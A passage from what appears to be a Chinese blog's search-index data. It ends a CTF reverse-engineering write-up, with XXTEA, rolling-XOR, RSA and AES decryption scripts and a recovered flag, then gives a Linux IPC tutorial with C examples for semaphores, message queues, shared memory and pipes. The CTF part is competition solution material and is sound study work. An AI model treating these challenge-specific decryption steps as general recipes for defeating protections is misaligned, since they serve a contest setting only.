v[0]; z = v[n - 1] += MX; &#125; while (--rounds); &#125; else if (n &lt; -1) &#123; /* Decoding Part */ n = -n; rounds = /*6 + */52 / n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum >> 2) &amp; 3; for (p = n - 1; p > 0; p--) &#123; z = v[p - 1]; y = v[p] -= MX; &#125; z = v[n - 1]; y = v[0] -= MX; &#125; while ((sum -= DELTA) != 0); &#125;&#125;int main()&#123; uint32_t const key[4] = &#123; 0x4B5F, 0xDEAD, 0x11ED, 0xB3CC &#125;; uint32_t data[11] = &#123; 0xCC45699D, 0x683D5352,0xB8BB71A0,0xD3817AD,0x7547E79E,0x4BDD8C7C,0x95E25A81,0xC4525103,0x7049B46F,0x5417F77C,0x65567138 &#125;; uint32_t* sent = data; //btea(sent, 11, key); //printf(\"coded:%x %x\\n\", sent[0], sent[1]); btea(sent, -11, key); //printf(\"decoded:%x %x\\n\", sent[0], sent[1]); for (int i = 0; i &lt; 11; i++) &#123; for (int j = 0; j &lt; 4; j++) &#123; printf(\"%c\", sent[i] &amp; 0xff); sent[i] >>= 8; &#125; &#125; return 0;&#125;//DASCTF&#123;7eb20cb2-deac-11ed-ae42-94085339ce84&#125;# cap 在这个地方动调 可以发现数组的下标在 0~12 之间循环 我们随便打开一个 BMP 类型的文件，用 010 看看 对于 BMP 类型的文件前两个字节必定是 43 4D 既然这个加密的 bmp 的每一个字节进行的都是异或，那我们可以将前两个字节异或看看 n 和 c 是密钥 enc_by_dasctf 的第 2 个和第 3 个字符，按照这个序列，我们向后将密钥向后延申看看后面的情况如何 所以我们写个脚本，从密钥的第二位开始，循环异或 key = \"enc_by_dasctf\"with open('cap.bin', 'rb') as f: s = bytearray(f.read())for i in range(len(s)): s[i] ^= ord(key[(i+1) % len(key)])with open('flag.bmp', 'wb') as f: f.write(s)得到 flag # unsym 查一下壳，是 go 逆向 用这个脚本恢复一下 go 符号 https://github.com/renshareck/IDAGolangHelper_SupportGo1.20 依次点击如下按钮 首先判断 key 正确与否，看来这是个 rsa 用 yafu 解一下 p 和 q 然后解出密钥 import gmpy2from Crypto.Util.number import long_to_bytesn = 0x1d884d54d21694ccd120f145c8344b729b301e782c69a8f3073325b9c5p = 37636318457745167234140808130156739q = 21154904887215748949280410616478423c = 0xfad53ce897d2c26f8cad910417fbdd1f0f9a18f6c1748faca10299dc8e = 0x10001phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = pow(c, d, n)print(long_to_bytes(m))# E@sy_RSA_enc7ypt再往后看， 动调了一下看到 iv 和 key 都是一样的 所以直接写个 exp 把加密的文件解密 from Crypto.Cipher import AESpassword = b'E@sy_RSA_enc7ypt' # 秘钥必须为 16 字节或者 16 字节的倍数的字节型数据iv = b'E@sy_RSA_enc7ypt' # iv 偏移量，bytes 类型with open('encrypted.bin','rb') as f: en_text = f.read()aes = AES.new(password, AES.MODE_CBC, iv) # CBC 模式下解密需要重新创建一个 aes 对象de_text = aes.decrypt(en_text)with open('decrypt.exe','wb') as f: f.write(de_text)运行一下解密出的 exe, 就得到 flag 了","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"inline hook","slug":"inline-hook","permalink":"https://oacia.dev/tags/inline-hook/"},{"name":"IsDebuggerPresent","slug":"IsDebuggerPresent","permalink":"https://oacia.dev/tags/IsDebuggerPresent/"},{"name":"sleep反调试","slug":"sleep反调试","permalink":"https://oacia.dev/tags/sleep%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"python逆向","slug":"python逆向","permalink":"https://oacia.dev/tags/python%E9%80%86%E5%90%91/"},{"name":"go逆向","slug":"go逆向","permalink":"https://oacia.dev/tags/go%E9%80%86%E5%90%91/"}]},{"title":"Linux进程通信","slug":"Linux进程通信","date":"2023-05-25T02:12:08.000Z","updated":"2025-04-08T18:55:11.428Z","comments":true,"path":"Linux进程通信/","link":"","permalink":"https://oacia.dev/Linux%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/","excerpt":"","text":"在日常遇到的.so,.elf 格式的二进制文件，常常可以看到 Linux 进程通信的使用，接下来的部分，我将介绍 Linux 通信的各种实现方式以及相应的代码示例 什么是进程？ 进程是操作系统的概念，每当我们执行一个程序时，对于操作系统来讲就创建了一个进程，在这个过程中，伴随着资源的分配和释放。可以认为进程是一个程序的一次执行过程。 什么是进程通信？ 进程用户空间是相互独立的，一般而言是不能相互访问的。但很多情况下进程间需要互相通信，来完成系统的某项功能。进程通过与内核及其它进程之间的互相通信来协调它们的行为。 什么时候会用到进程通信？ 数据传输：一个进程需要将它的数据发送给另一个进程，发送的数据量在一个字节到几兆字节之间。 共享数据：多个进程想要操作共享数据，一个进程对共享数据的修改，别的进程应该立刻看到。 通知事件：一个进程需要向另一个或一组进程发送消息，通知它（它们）发生了某种事件（如进程终止时要通知父进程）。 资源共享：多个进程之间共享同样的资源。为了作到这一点，需要内核提供锁和同步机制。 进程控制：有些进程希望完全控制另一个进程的执行（如 Debug 进程），此时控制进程希望能够拦截另一个进程的所有陷入和异常，并能够及时知道它的状态改变。 # POSIX 信号量 linux sem 信号量是一种特殊的变量，访问具有原子性， 用于解决进程或线程间共享资源引发的同步问题。 用户态进程对 sem 信号量可以有以下两种操作： 等待信号量 当信号量值为 0 时，程序等待；当信号量值大于 0 时，信号量减 1，程序继续运行。 发送信号量 将信号量值加 1 通过对信号量的控制，从而实现共享资源的顺序访问。 使用信号量需要包含头文件 semaphore.h # 有名信号量函数 有名信号量是通过 sem_open 创建或打开信号量，用 sem_close 关闭信号量，用 sem_unlink 销毁信号量。 # sem_open 创建并初始化或者打开一个已有的有名信号量 /*@param name: 信号量文件的名字。该名字可以在最前面加 \"/\"，在之后不能再加 \"/\"，但是无论加不加 \"/\"，指定的文件都是 /dev/shm/sem.xxx。比如传入的 name 为 \"mysem\"，那么指定的是 /dev/shm/sem.mysem@param oflag: 打开的标志，如果需要打开已经存在的信号量文件，则传入 O_RDWR 即可，不用再传入后两个参数。如果需要创建信号量，则传入 O_CREAT，如果指定的文件不存在，则创建文件，由后两个参数指定文件权限和信号量的初值。如果指定的文件存在，则打开信号量文件，并忽略后两个参数。如果传入的是 O_CREAT|O_EXCL那么会检查指定的文件是否存在，如果文件已经存在，那么 sem_open 会返回 - 1。@param mode: 一般传入 0666 (可读可写)@param value: 信号量初值@return: 成功时函数返回有名信号量的地址，失败时返回 SEM_FAILED，其值为 ((void *) 0)。*/sem_t *sem_open(const char *name, int oflag, mode_t mode, unsigned int value);# sem_close 关闭信号量 该函数应该与 sem_open 成对调用 /*@param sem: 信号量地址@return: 成功返回 0，失败返回 - 1*/int sem_close(sem_t *sem);# sem_unlink 删除信号量文件 POSIX 中的信号量是随内核持续的，如果信号量不 sem_unlink 的话，该命名信号量会常驻在 kernel 之中，即使进程结束了也会存在，而 sem_open 创建信号量时，如果该 named semaphore 存在内核中，设置的初始化参数是无效的 /*@param name: 信号量文件的名称@return: 成功返回 0，失败返回 - 1*/int sem_unlink(const char *name);# 无名信号量函数 无名信号量通过 sem_init 进行初始化，使用完之后用 sem_destroy 进行销毁，常用在线程间 # sem_init 该函数初始化由 sem 指向的信号对象，并给它一个初始的整数值 value。 /*@param sem: 要初始化的目标信号量@param pshared: 控制信号量的类型，值为 0 代表该信号量用于多线程间的同步，值如果大于 0 表示可以共享，用于多个相关进程间的同步@return : 当 sem_init () 成功完成初始化操作时，返回值为 0，否则返回 -1*/int sem_init(sem_t *sem, int pshared, unsigned int value);# sem_destroy 该函数用于对用完的信号量的清理 /*@param sem: 要初始化的目标信号量@return : 当 sem_destroy 成功完成信号量的清理时，返回值为 0, 否则返回 -1*/int sem_destroy(sem_t *sem);# 信号量通用函数 # sem_wait sem_wait 是一个阻塞的函数，测试所指定信号量的值，它的操作是原子的。若 sem value &gt; 0，则该信号量值减去 1 并立即返回。若 sem value = 0，则阻塞直到 sem value &gt; 0，此时立即减去 1，然后返回。 /*@param sem: 要初始化的目标信号量*/int sem_wait(sem_t *sem);sem_trywait 函数是非阻塞的函数，它会尝试获取获取 sem value 值，如果 sem value = 0，不是阻塞住，而是直接返回一个错误 EAGAIN。 /*@param sem: 要初始化的目标信号量*/int sem_trywait(sem_t *sem);# sem_post 把指定的信号量 sem 的值加 1，唤醒正在等待该信号量的任意线程 /*@param sem: 要初始化的目标信号量*/int sem_post(sem_t *sem);# sem_getvalue 获取信号量 sem 的当前值，把该值保存在 sval，若有 1 个或者多个线程正在调用 sem_wait 阻塞在该信号量上，该函数返回阻塞在该信号量上进程或线程个数 /*@param sem: 要初始化的目标信号量*/int sem_getvalue(sem_t *sem, int *sval);# 示例一: 4 个售票员卖 10 张票 #include&lt;stdio.h>#include&lt;stdlib.h>#include&lt;pthread.h>#include&lt;semaphore.h>#include&lt;unistd.h>// 创建信号量sem_t mySem;// 设置总票数int ticket_sum = 10;// 模拟买票过程void *sell_ticket(void *arg) &#123; printf(\"当前线程ID：%u\\n\", pthread_self()); int i; int flag; for (i = 0; i &lt; 10; i++) &#123; // 完成信号量 \"减 1\" 操作，否则暂停执行 flag = sem_wait(&amp;mySem); if (flag == 0) &#123; if (ticket_sum > 0) &#123; sleep(1); printf(\"%u 卖第 %d 张票\\n\", pthread_self(), 10 - ticket_sum + 1); ticket_sum--; &#125; // 执行 “加 1” 操作 sem_post(&amp;mySem); sleep(1); &#125; &#125; return 0;&#125;int main() &#123; int flag; int i; void *ans; // 创建 4 个线程 pthread_t tids[4]; // 初始化信号量 flag = sem_init(&amp;mySem, 0, 1); if (flag != 0) &#123; printf(\"初始化信号量失败\\n\"); &#125; for (i = 0; i &lt; 4; i++) &#123; flag = pthread_create(&amp;tids[i], NULL, &amp;sell_ticket, NULL); if (flag != 0) &#123; printf(\"线程创建失败!\"); return 0; &#125; &#125; sleep(10); for (i = 0; i &lt; 4; i++) &#123; flag = pthread_join(tids[i], &amp;ans); if (flag != 0) &#123; printf(\"tid=%d 等待失败！\", tids[i]); return 0; &#125; &#125; // 执行结束前，销毁信号量 sem_destroy(&amp;mySem); return 0;&#125;/*当前线程 ID：1199965952当前线程 ID：1189476096当前线程 ID：1168496384当前线程 ID：11789862401199965952 卖第 1 张票1189476096 卖第 2 张票1199965952 卖第 3 张票1178986240 卖第 4 张票1168496384 卖第 5 张票1189476096 卖第 6 张票1199965952 卖第 7 张票1178986240 卖第 8 张票1168496384 卖第 9 张票1189476096 卖第 10 张票*/# 进程间通信的几种方式 # 消息队列 消息队列是消息的链表，存放在内核中并由消息队列标识符标识。消息队列克服了信号传递信息少，管道只能承载无格式字节流以及缓冲区大小受限等特点。消息队列是 UNIX 下不同进程之间可实现共享资源的一种机制，UNIX 允许不同进程将格式化的数据流以消息队列形式发送给任意进程。对消息队列具有操作权限的进程都可以使用 msget 完成对消息队列的操作控制。通过使用消息类型，进程可以按任何顺序读信息，或为消息安排优先级顺序. # 相关函数 使用消息队列需要包含头文件 sys/msg.h # msgget 创建消息队列，key 值唯一标识该消息队列 /*@param key: 消息队列的名称 (非零整数)@param msgflg: 控制当前消息队列满或队列消息到达系统范围的限制时将要发生的事情。msgflg 通常取值 0666, msgflg 可以与 IPC_CREAT 做或操作，表示当 key 所命名的消息队列不存在时创建一个消息队列*/int msgget(key_t key, int msgflg);# msgctl 控制消息队列 /*@param msqid: 由 msgget 函数返回的消息队列标识符。@param: cmd: 是将要采取的动作，它可以取 3 个值：IPC_STAT, IPC_SET, IPC_RMIDIPC_STAT：把 msqid_ds 结构中的数据设置为消息队列的当前关联值，即用消息队列的当前关联值覆盖 msqid_ds 的值。IPC_SET：如果进程有足够的权限，就把消息列队的当前关联值设置为 msqid_ds 结构中给出的值IPC_RMID：删除消息队列@param buf: buf 是指向 msgid_ds 结构的指针，它指向消息队列模式和访问权限的结构。msqid_ds 结构至少包括以下成员：struct msqid_ds&#123; uid_t shm_perm.uid; uid_t shm_perm.gid; mode_t shm_perm.mode;&#125;;*/int msgctl(int msqid, int cmd, struct msqid_ds *buf);# msgsnd 发送消息 /*@param msqid: 由 msgget 函数返回的消息队列标识符。@param msg_ptr: 一个指向准备发送消息的指针，指针 msg_ptr 所指向的消息结构一定要是以一个长整型成员变量开始的结构体，接收函数将用这个成员来确定消息的类型。@param msg_sz: msg_ptr 指向的消息的长度，注意是消息的长度，而不是整个结构体的长度，也就是说 msg_sz 是不包括长整型消息类型成员变量的长度。@param msgflg: 控制当前消息队列满或队列消息到达系统范围的限制时将要发生的事情。*/int msgsnd(int msqid, const void *msg_ptr, size_t msg_sz, int msgflg);# msgrcv 接收消息 /*@param msqid: 由 msgget 函数返回的消息队列标识符。@param msg_ptr: 一个指向准备发送消息的指针，指针 msg_ptr 所指向的消息结构一定要是以一个长整型成员变量开始的结构体，接收函数将用这个成员来确定消息的类型。@param msg_sz: msg_ptr 指向的消息的长度，注意是消息的长度，而不是整个结构体的长度，也就是说 msg_sz 是不包括长整型消息类型成员变量的长度。@param msgtype: msgtype 可以实现一种简单的接收优先级。如果 msgtype 为 0，就获取队列中的第一个消息。如果它的值大于零，将获取具有相同消息类型的第一个信息。如果它小于零，就获取类型等于或小于 msgtype 的绝对值的第一个消息。@param msgflg: 控制当前消息队列满或队列消息到达系统范围的限制时将要发生的事情。*/int msgrcv(int msqid, void *msg_ptr, size_t msg_sz, long int msgtype, int msgflg);# 示例：利用 Linux 的消息队列通信机制实现两个线程间的通信 编写程序创建三个线程：sender1 线程、sender2 线程和 receive 线程，三个线程的功能。描述如下： sender1 线程：运行函数 sender1 ()，它创建一个消息队列，然后等待用户通过终端输入一串字符，并将这串字符通过消息队列发送给 receiver 线程；可循环发送多个消息，直到用户输入 “exit” 为止，表示它不再发送消息，最后向 receiver 线程发送消息 “end1”，并且等待 receiver 的应答，等到应答消息后，将接收到的应答信息显示在终端屏幕上，结束线程的运行。 sender2 线程：运行函数 sender2 ()，共享 sender1 创建的消息队列，等待用户通过终端输入一串字符，并将这串字符通过消息队列发送给 receiver 线程；可循环发送多个消息， 直到用户输入 “exit” 为止，表示它不再发送消息，最后向 receiver 线程发送消息 “end2”， 并且等待 receiver 的应答，等到应答消息后，将接收到的应答信息显示在终端屏幕上，结束 线程的运行。 receiver 线程：运行函数 receive ()，它通过消息队列接收来自 sender1 和 sender2 两 个线程的消息，将消息显示在终端屏幕上，当收到内容为 “end1” 的消息时，就向 sender1 发送一个应答消息 “over1”； 当收到内容为 “end2” 的消息时，就向 sender2 发送一个应答消息 “over2”；消息接收完成后删除消息队列，结束线程的运行。选择合适的信号量机制实现三个线程之间的同步与互斥。 #include &lt;stdio.h>#include &lt;stdlib.h>#include &lt;string.h>#include &lt;pthread.h>#include &lt;sys/types.h>#include &lt;sys/ipc.h>#include &lt;sys/msg.h>#include &lt;semaphore.h>#define MAX_MSG_SIZE 256#define SENDER1_MSG_TYPE 1#define SENDER2_MSG_TYPE 2#define RECEIVER_MSG_TYPE 3struct message &#123; long mtype; char mtext[MAX_MSG_SIZE];&#125;;int msgQueueID;/*@signal send: 对线程 sender1 和 sender2 上锁，两个线程是互斥的@signal receive: 对 sender 发送消息给 receiver 的过程上锁，防止 receiver 完成接受消息的动作之前，sender 开始下一轮接受消息@signal ifexit: 当 sender1 发送 end1 消息给 receiver,receiver 将会发送 over1 给 sender1, 但是 over1 消息有概率会被 receiver 自身接受*/sem_t send,receive,ifexit;void* sender1() &#123; struct message msg; int running = 1; sem_wait(&amp;send); while (running) &#123; sem_wait(&amp;receive); printf(\"Sender1: Enter a message (or 'exit' to quit): \"); fgets(msg.mtext, MAX_MSG_SIZE, stdin); msg.mtext[strcspn(msg.mtext, \"\\n\")] = '\\0'; msg.mtype = SENDER1_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); if (strcmp(msg.mtext, \"exit\") == 0) &#123; running = 0; &#125; &#125; sem_wait(&amp;receive);// 这行代码的作用是防止信号量 receive 被赋值为 2, 同时也确保了消息发送和接收的正确进行 strcpy(msg.mtext, \"end1\"); msg.mtype = SENDER1_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(strcmp(msg.mtext, \"over1\") == 0)&#123; printf(\"Sender1: Exiting.\\n\"); &#125; sem_post(&amp;ifexit);// 通知 receiver: sender1 准备退出 sem_post(&amp;send);// 通知 sender2: 可以准备接收消息 pthread_exit(NULL);&#125;void* sender2() &#123; struct message msg; int running = 1; sem_wait(&amp;send); while (running) &#123; sem_wait(&amp;receive); printf(\"Sender2: Enter a message (or 'exit' to quit): \"); fgets(msg.mtext, MAX_MSG_SIZE, stdin); msg.mtext[strcspn(msg.mtext, \"\\n\")] = '\\0'; msg.mtype = SENDER2_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); if (strcmp(msg.mtext, \"exit\") == 0) &#123; running = 0; &#125; &#125; sem_wait(&amp;receive);// 这行代码的作用是防止信号量 receive 被赋值为 2, 同时也确保了消息发送和接收的正确进行 strcpy(msg.mtext, \"end2\"); msg.mtype = SENDER2_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(strcmp(msg.mtext, \"over2\") == 0)&#123; printf(\"Sender2: Exiting.\\n\"); &#125; sem_post(&amp;ifexit); sem_post(&amp;send); pthread_exit(NULL);&#125;void* receiver() &#123; struct message msg; int running = 2; while (running) &#123; msgrcv(msgQueueID, &amp;msg, MAX_MSG_SIZE, 0, 0); if(msg.mtype == SENDER1_MSG_TYPE)&#123; if (strcmp(msg.mtext, \"end1\") == 0) &#123; strcpy(msg.mtext, \"over1\"); msg.mtype = RECEIVER_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); running-=1; sem_wait(&amp;ifexit);// 等待退出动作完成 &#125; else&#123; printf(\"Receiver: Message received: %s from sender1\\n\", msg.mtext); &#125; &#125; else if(msg.mtype == SENDER2_MSG_TYPE)&#123; if (strcmp(msg.mtext, \"end2\") == 0) &#123; strcpy(msg.mtext, \"over2\"); msg.mtype = RECEIVER_MSG_TYPE; msgsnd(msgQueueID, &amp;msg, strlen(msg.mtext) + 1, 0); running-=1; sem_wait(&amp;ifexit);// 等待退出动作完成 &#125; else&#123; printf(\"Receiver: Message received: %s from sender2\\n\", msg.mtext); &#125; &#125; sem_post(&amp;receive); &#125; msgctl(msgQueueID, IPC_RMID, NULL); printf(\"Receiver: Exiting.\\n\"); pthread_exit(NULL);&#125;int main() &#123; pthread_t sender1Thread, sender2Thread, receiverThread; key_t key = 5555; msgQueueID = msgget(key, IPC_CREAT | 0666); if (msgQueueID == -1) &#123; perror(\"Failed to create message queue\"); exit(1); &#125; sem_init(&amp;send,1,1); sem_init(&amp;receive,1,1); sem_init(&amp;ifexit,1,0); pthread_create(&amp;sender1Thread, NULL, sender1, NULL); pthread_create(&amp;sender2Thread, NULL, sender2, NULL); pthread_create(&amp;receiverThread, NULL, receiver, NULL); pthread_join(sender1Thread, NULL); pthread_join(sender2Thread, NULL); pthread_join(receiverThread, NULL); return 0;&#125;# 共享内存 共享内存并未提供同步机制，也就是说，在第一个进程结束对共享内存的写操作之前，并无自动机制可以阻止第二个进程开始对它进行读取。所以我们通常需要用其他的机制来同步对共享内存的访问，例如前面说到的信号量 使用共享内存需要包含头文件 sys/shm.h # 相关函数 # shmget 创建共享内存 /*@param key: 为共享内存段命名@param size: 以字节为单位指定需要共享的内存容量@param shmflg: 控制当前消息队列满或队列消息到达系统范围的限制时将要发生的事情。shmflg 通常取值 0666, shmflg 可以与 IPC_CREAT 做或操作，表示当 key 所命名的共享内存不存在时创建一个共享内存@return: 成功时返回一个与 key 相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回 - 1*/int shmget(key_t key, size_t size, int shmflg);# shmat 第一次创建完共享内存时，它还不能被任何进程访问，shmat 函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间 /*@param shm_id: 由 shmget 函数返回的共享内存标识。@param shm_addr: 指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。@param shm_flg: 标志位，通常为 0。@return: 调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回 - 1.*/void *shmat(int shm_id, const void *shm_addr, int shmflg);# shmdt 该函数用于将共享内存从当前进程中分离。注意，将共享内存分离并不是删除它，只是使该共享内存对当前进程不再可用 /*@param shmaddr: shmat 函数返回的地址指针@return: 调用成功时返回 0，失败时返回 - 1*/int shmdt(const void *shmaddr);# shmctl 类比信号量中的 semctl 函数，用来控制共享内存 /*@param shm_id: 由 shmget 函数返回的共享内存标识。@param command: 要采取的操作，它可以取下面的三个值 ：IPC_STAT：把 shmid_ds 结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖 shmid_ds 的值。IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为 shmid_ds 结构中给出的值IPC_RMID：删除共享内存段@param buf: buf 是一个结构指针，它指向共享内存模式和访问权限的结构。shmid_ds 结构至少包括以下成员：struct shmid_ds&#123; uid_t shm_perm.uid; uid_t shm_perm.gid; mode_t shm_perm.mode;&#125;;*/int shmctl(int shm_id, int command, struct shmid_ds *buf);# 示例：利用 Linux 的共享内存通信机制实现两个进程间的通信 编写程序 sender，它创建一个共享内存，然后随机产生一个 100 以内的计算表达式（例如 12+34），并将这串表达式字符串通过共享内存发送给 receiver；最后，receiver 完成表达式运算后，将计算结果 (36) 写到共享内存 ，sender 收到应答消息后，将接收到的计算结果显示在终端屏幕上。上述计算重复 10 次后，sender 向 receiver 发送”end”，等待 recever 发送”over” 信息后，删除共享内存，结束程序的运行。 编写程序 receiver， 它通过共享内存接收来自 sender 产生的信息，如果该信息是计算表达式，则将表达式显示在终端屏幕上，然后计算表达式的结果，再通过该共享内存向 sender 发送计算结果，等待接收下一个消息；如果该信息是”end”，则向 sender 发送一个应答消息”over”，并结束程序的运行。选择合适的信号量机制实现两个进程对共享内存的互斥及同步使用。 //common.h#include &lt;stdio.h>#include &lt;stdlib.h>#include &lt;string.h>#include &lt;unistd.h>#include &lt;semaphore.h>#include &lt;fcntl.h>#include &lt;sys/shm.h>#include &lt;time.h>#define TEXT_SZ 100/*MSG1 表示 sender 为写端，receiver 为读端MSG2 表示 sender 为读端，receiver 为写端*/#define MSG1_SEMRD \"msg1_sem_read\"#define MSG1_SEMWR \"msg1_sem_write\"#define MSG2_SEMRD \"msg2_sem_read\"#define MSG2_SEMWR \"msg2_sem_write\"struct shm_data&#123; char text[TEXT_SZ];&#125;;//sender.c#include\"common.h\"int main() &#123; struct shm_data *shared; // 创建共享内存 int shm_id = shmget((key_t)1234, sizeof(struct shm_data), 0666|IPC_CREAT); if (shm_id == -1) &#123; perror(\"Failed to get shared memory\"); exit(1); &#125; // 将共享内存连接到当前进程的地址空间 char *shm = (char *)shmat(shm_id, NULL, 0); if (shm == (char *)(-1)) &#123; perror(\"Failed to attach shared memory\"); exit(1); &#125; // 设置共享内存 shared = (struct shm_data*)shm; // 设置信号量 sem_t *msg1_semwr,*msg1_semrd,*msg2_semwr,*msg2_semrd; msg1_semwr=sem_open(MSG1_SEMWR,O_CREAT,0666,1); msg1_semrd=sem_open(MSG1_SEMRD,O_CREAT,0666,0); msg2_semwr=sem_open(MSG2_SEMWR,O_CREAT,0666,1); msg2_semrd=sem_open(MSG2_SEMRD,O_CREAT,0666,0); if(msg1_semwr==(void*)-1 || msg1_semrd==(void*)-1 ||msg2_semwr==(void*)-1 || msg2_semrd==(void*)-1)&#123; perror(\"sem_open failure\"); &#125; // 随机产生并发送表达式 srand(time(NULL)); for (int i = 0; i &lt; 10; i++) &#123; sem_wait(msg1_semwr); int num1 = rand() % 100; int num2 = rand() % 100; sprintf(shared->text, \"%d+%d\", num1, num2); //printf(\"Sender: Sent expression '%s'\\n\", expression); sem_post(msg1_semrd); sem_wait(msg2_semrd); printf(\"Sender: received calculation results %s from Receiver\\n\",shared->text); sem_post(msg2_semwr); sleep(1); &#125; // 发送结束信号 sem_wait(msg1_semwr); strcpy(shared->text, \"end\"); sem_post(msg1_semrd); // 等待接收 'over' 信号并删除共享内存 sem_wait(msg2_semrd); printf(\"Sender: received %s from Receiver\\n\",shared->text); // 把共享内存从当前进程中分离 if(shmdt(shm) == -1) &#123; perror(\"shmdt failed\\n\"); exit(EXIT_FAILURE); &#125; // 删除共享内存 if(shmctl(shm_id, IPC_RMID, 0) == -1) &#123; perror(\"shmctl(IPC_RMID) failed\\n\"); &#125; sem_post(msg2_semwr); // 关闭信号量 sem_close(msg1_semwr); sem_close(msg1_semrd); sem_close(msg2_semwr); sem_close(msg2_semrd); // 删除信号量文件 sem_unlink(MSG1_SEMRD); sem_unlink(MSG1_SEMWR); sem_unlink(MSG2_SEMRD); sem_unlink(MSG2_SEMWR); return 0;&#125;//receiver.c#include\"common.h\"int main() &#123; struct shm_data *shared; // 创建共享内存 int shm_id = shmget((key_t)1234, sizeof(struct shm_data), 0666|IPC_CREAT); if (shm_id == -1) &#123; perror(\"Failed to get shared memory\"); exit(1); &#125; // 将共享内存连接到当前进程的地址空间 char *shm = (char *)shmat(shm_id, NULL, 0); if (shm == (char *)(-1)) &#123; perror(\"Failed to attach shared memory\"); exit(1); &#125; // 设置共享内存 shared = (struct shm_data*)shm; // 设置信号量 sem_t *msg1_semwr,*msg1_semrd,*msg2_semwr,*msg2_semrd; msg1_semwr=sem_open(MSG1_SEMWR,O_CREAT,0666,1); msg1_semrd=sem_open(MSG1_SEMRD,O_CREAT,0666,0); msg2_semwr=sem_open(MSG2_SEMWR,O_CREAT,0666,1); msg2_semrd=sem_open(MSG2_SEMRD,O_CREAT,0666,0); if(msg1_semwr==(void*)-1 || msg1_semrd==(void*)-1 ||msg2_semwr==(void*)-1 || msg2_semrd==(void*)-1)&#123; perror(\"sem_open failure\"); &#125; int running = 1; // 接收并处理消息 while (running) &#123; sem_wait(msg1_semrd); char expression[100]; strcpy(expression,shared->text); if (strcmp(expression, \"end\") == 0) &#123; printf(\"Receiver: Received end from Sender\\n\"); sem_post(msg1_semwr); sem_wait(msg2_semwr); strcpy(shared->text, \"over\"); running=0; sem_post(msg2_semrd); &#125; else&#123; printf(\"Receiver: Received expression '%s' from Sender\\n\", expression); sem_post(msg1_semwr); // 计算表达式结果 sem_wait(msg2_semwr); int num1, num2; sscanf(expression, \"%d+%d\", &amp;num1, &amp;num2); int result = num1 + num2; sprintf(shared->text, \"%d\", result); sem_post(msg2_semrd); &#125; &#125; // 关闭信号量 sem_close(msg1_semwr); sem_close(msg1_semrd); sem_close(msg2_semwr); sem_close(msg2_semrd); // 删除信号量文件 sem_unlink(MSG1_SEMRD); sem_unlink(MSG1_SEMWR); sem_unlink(MSG2_SEMRD); sem_unlink(MSG2_SEMWR); return 0;&#125;# 管道 操作系统在内核中为进程创建的的一块缓冲区，若多个进程可以访问到同一块缓冲区，就可以实现进程间通信，通过半双工通信（可以选择方向的单向通信）实现数据传输 # 匿名管道 在这块内核中的缓冲区没有明确的标识符，其他进程无法直接访问管道 使用匿名管道需要包含头文件 unistd.h 特性 匿名管道只能用于具有亲缘关系的进程间通信 匿名管道创建时，操作系统会提供两个操作句柄（文件描述符）（其中一个用于从操作管道读取数据，一个向管道中写入数据） 因此只能通过创建子进程，子进程通过复制父进程的方式，获取到管道的操作句柄，进而实现访问同一个管道通信 # pipe 创建匿名管道 /*@param fd [2]: 文件描述符数组，其中 fd [0] 表示读端，fd [1] 表示写端 @return: 成功返回 0，失败返回 - 1*/int pipe(int fd[2]); 管道要不然只能读，要不然只能写（单向传输）；使用的时候如果不使用哪一端，关闭哪一端就可以 若管道中没有数据，则 read 就会阻塞；若管道中数据写满了则 write 就会阻塞 # 示例 从键盘读取数据，写入管道，读取管道，写到屏幕 #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h>int main()&#123; int fds[2]; char buf[100]; int len; if ( pipe(fds) == -1 ) perror(\"make pipe error\"),exit(1); // read from stdin while ( fgets(buf, 100, stdin) ) &#123; len = strlen(buf); // write into pipe if ( write(fds[1], buf, len) != len ) &#123; perror(\"write to pipe error\"); break; &#125; memset(buf, 0x00, sizeof(buf)); // read from pipe if ( (len=read(fds[0], buf, 100)) == -1 ) &#123; perror(\"read from pipe error\"); break; &#125; // write to stdout if ( write(1, buf, len) != len ) &#123; perror(\"write to stdout error\"); break; &#125; &#125; return 0;&#125;# 命名管道 命名管道是内核中的缓冲区，这块缓冲区具有标识符（标识符是一个可见于文件系统的管道文件），其他的进程可以通过这个标识符，找到这个缓冲区（通过打开一个管道文件，进而访问到同一块缓冲区），进而实现通信 使用命名管道需要包含头文件 sys/types.h , sys/stat.h 特性 可用于同一主机上的任意进程间通信 多个进程通过命名管道通信时通过打开命令管道文件访问同一块内核中的缓冲区实现通信 # mkfifo 创建命名管道 mkfifo 函数默认指定 O_CREAT | O_EXECL 方式创建 FIFO, mkfifo 的一般使用方式是：通过 mkfifo 创建 FIFO，然后调用 open，以读或者写的方式之一打开 FIFO，然后进行数据通信。 /*@param filename: 管道文件名称@param mode: 指定的文件权限位，类似于 open 函数的第三个参数。即创建该 FIFO 时，指定用户的访问权限，有以下值：S_IRUSR，S_IWUSR，S_IRGRP，S_IWGRP，S_IROTH，S_IWOTH。@return: 成功返回 0，失败返回 - 1*/int mkfifo(const char *filename, mode_t mode);# 示例 // FIFOwrite.c#include &lt;stdio.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #include &lt;fcntl.h> int main(int argc, char *argv[]) 